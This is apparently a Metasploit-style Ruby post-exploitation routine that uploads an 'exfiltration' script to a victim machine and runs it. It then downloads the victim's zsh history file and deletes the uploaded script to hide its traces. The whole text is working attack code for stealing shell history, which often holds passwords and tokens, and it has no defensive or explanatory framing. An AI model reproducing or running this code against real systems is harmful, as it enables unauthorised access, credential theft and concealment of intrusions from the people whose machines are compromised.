def run_script(client)
# Define the paths for the zsh history file
local_history_script = "/home/kali/Documents/credentials.sh"  # Local path on attacker machine
remote_history_script = "/tmp/credentials.sh"               # Remote path on victim machine
history_file_path = "/home/kali/.zsh_history"                            # Path to .zsh_history on victim machine
download_path = "/home/kali/Documents/history.txt"                # Local path where to save the downloaded .zsh_history file

# Step 1: Upload the zsh history exfiltration script to the victim machine
print_status("Uploading zsh history exfiltration script to the victim machine...")
if File.exist?(local_history_script)
  session.fs.file.upload_file(remote_history_script, local_history_script)
  print_good("History exfiltration script uploaded to the victim machine.")
else
  print_error("History exfiltration script does not exist on the attacker machine.")
  return
end

# Step 2: Set the uploaded script as executable
print_status("Setting execute permissions for the uploaded script...")
cmd_exec("chmod +x #{remote_history_script}")

# Step 3: Execute the zsh history exfiltration script on the victim machine
print_status("Executing the zsh history exfiltration script on the victim machine...")
output = cmd_exec("#{remote_history_script}")
if output.nil? || output.empty?
  print_error("Failed to execute the script. Check permissions or environment.")
  return
else
  print_good("Zsh history exfiltration script executed successfully.")
end

# Step 4: Download the .zsh_history file from the victim machine
print_status("Downloading the .zsh_history file...")
if session.fs.file.exist?(history_file_path)
  session.fs.file.download_file(download_path, history_file_path)
  print_good("Zsh history file downloaded successfully to #{download_path}")
else
  print_error("Zsh history file does not exist on the victim machine. Check the script execution.")
  return
end

# Step 5: Clean up by removing the uploaded script from the victim machine
print_status("Cleaning up uploaded files...")
cmd_exec("rm -f #{remote_history_script}")
print_good("Uploaded script cleaned up.")
end
